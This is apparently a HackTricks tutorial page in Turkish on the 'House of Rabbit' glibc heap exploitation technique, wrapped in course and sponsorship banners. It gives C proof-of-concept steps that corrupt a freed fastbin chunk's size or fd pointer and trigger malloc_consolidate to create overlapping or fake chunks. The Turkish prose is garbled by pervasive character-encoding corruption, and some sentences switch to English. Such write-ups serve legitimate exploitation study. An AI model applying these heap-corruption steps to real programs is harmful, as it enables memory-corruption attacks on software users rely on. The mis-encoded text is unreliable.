# House of Rabbit

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

### Gereksinimler

1. **HÄ±zlÄ± bin fd iÅŸaretÃ§isini veya boyutunu deÄŸiÅŸtirme yeteneÄŸi**: Bu, hÄ±zlÄ± bin iÃ§indeki bir parÃ§anÄ±n ileri iÅŸaretÃ§isini veya boyutunu deÄŸiÅŸtirebileceÄŸiniz anlamÄ±na gelir.
2. **`malloc_consolidate`'i tetikleme yeteneÄŸi**: Bu, ya bÃ¼yÃ¼k bir parÃ§a ayÄ±rarak ya da Ã¼st parÃ§ayÄ± birleÅŸtirerek yapÄ±labilir; bu, yÄ±ÄŸÄ±n parÃ§alarÄ±nÄ± birleÅŸtirmeye zorlar.

### Hedefler

1. **Ãœst Ã¼ste binen parÃ§alar oluÅŸturma**: Bir parÃ§anÄ±n diÄŸerinin Ã¼stÃ¼ne gelmesini saÄŸlamak, bÃ¶ylece daha fazla yÄ±ÄŸÄ±n manipÃ¼lasyonu yapÄ±lmasÄ±na olanak tanÄ±mak.
2. **Sahte parÃ§alar oluÅŸturma**: YÄ±ÄŸÄ±n iÅŸlemleri sÄ±rasÄ±nda sahte bir parÃ§ayÄ± meÅŸru bir parÃ§a olarak ele almasÄ± iÃ§in ayÄ±rÄ±cÄ±yÄ± kandÄ±rmak.

## SaldÄ±rÄ± AdÄ±mlarÄ±

### POC 1: HÄ±zlÄ± bin parÃ§a boyutunu deÄŸiÅŸtirme

**AmaÃ§**: HÄ±zlÄ± bin parÃ§asÄ±nÄ±n boyutunu manipÃ¼le ederek Ã¼st Ã¼ste binen bir parÃ§a oluÅŸturmak.

* **AdÄ±m 1: ParÃ§alarÄ± AyÄ±r**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Ä°ki adet 0x40 baytlÄ±k parÃ§a ayÄ±rÄ±yoruz. Bu parÃ§alar serbest bÄ±rakÄ±ldÄ±klarÄ±nda hÄ±zlÄ± kutu listesine yerleÅŸtirilecektir.

* **AdÄ±m 2: ParÃ§alarÄ± Serbest BÄ±rak**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
We free both chunks, adding them to the fastbin list.

* **AdÄ±m 3: ParÃ§a Boyutunu DeÄŸiÅŸtir**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
We change the size metadata of `chunk1` to 0xa1. This is a crucial step to trick the allocator during consolidation.

* **AdÄ±m 4: `malloc_consolidate`'i tetikle**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
BÃ¼yÃ¼k bir parÃ§a ayÄ±rmak, kÃ¼Ã§Ã¼k parÃ§alarÄ± hÄ±zlÄ± kutuda birleÅŸtiren `malloc_consolidate` fonksiyonunu tetikler. ManipÃ¼le edilen `chunk1` boyutu, `chunk2` ile Ã¶rtÃ¼ÅŸmesine neden olur.

BirleÅŸtirmeden sonra, `chunk1` `chunk2` ile Ã¶rtÃ¼ÅŸÃ¼r ve daha fazla istismar olanaÄŸÄ± saÄŸlar.

### POC 2: `fd` iÅŸaretÃ§isini deÄŸiÅŸtir

**AmaÃ§**: HÄ±zlÄ± kutu `fd` iÅŸaretÃ§isini manipÃ¼le ederek sahte bir parÃ§a oluÅŸturmak.

* **AdÄ±m 1: ParÃ§alarÄ± AyÄ±r**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**AÃ§Ä±klama**: YÄ±ÄŸÄ±n iÃ§in sahte parÃ§a oluÅŸturmak amacÄ±yla bir kÃ¼Ã§Ã¼k ve bir bÃ¼yÃ¼k iki parÃ§a ayÄ±rÄ±yoruz.

* **AdÄ±m 2: Sahte parÃ§a oluÅŸtur**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
`chunk2` iÃ§ine sahte parÃ§a meta verisi yazÄ±yoruz, bÃ¶ylece daha kÃ¼Ã§Ã¼k parÃ§alarÄ± simÃ¼le ediyoruz.

* **AdÄ±m 3: `chunk1`'i serbest bÄ±rak**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**AÃ§Ä±klama**: `chunk1`'i serbest bÄ±rakÄ±yoruz, bunu fastbin listesine ekliyoruz.

* **AdÄ±m 4: `chunk1`'in `fd`'sini DeÄŸiÅŸtir**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**AÃ§Ä±klama**: `chunk1`'in ileri iÅŸaretÃ§isini (`fd`) `chunk2` iÃ§indeki sahte parÃ§amÄ±za iÅŸaret edecek ÅŸekilde deÄŸiÅŸtiriyoruz.

* **AdÄ±m 5: `malloc_consolidate`'i tetikle**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
BÃ¼yÃ¼k bir parÃ§a ayÄ±rmak tekrar `malloc_consolidate`'i tetikler, bu da sahte parÃ§ayÄ± iÅŸler.

Sahte parÃ§a hÄ±zlÄ± listeye dahil olur, bu da onu daha fazla istismar iÃ§in meÅŸru bir parÃ§a haline getirir.

### Ã–zet

**House of Rabbit** tekniÄŸi, bir hÄ±zlÄ± parÃ§a boyutunu deÄŸiÅŸtirerek Ã¼st Ã¼ste binen parÃ§alar oluÅŸturmayÄ± veya sahte parÃ§alar oluÅŸturmak iÃ§in `fd` iÅŸaretÃ§isini manipÃ¼le etmeyi iÃ§erir. Bu, saldÄ±rganlarÄ±n yÄ±ÄŸÄ±nda meÅŸru parÃ§alar oluÅŸturmasÄ±na olanak tanÄ±r ve Ã§eÅŸitli istismar biÃ§imlerini mÃ¼mkÃ¼n kÄ±lar. Bu adÄ±mlarÄ± anlamak ve uygulamak, yÄ±ÄŸÄ±n istismar becerilerinizi geliÅŸtirecektir.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
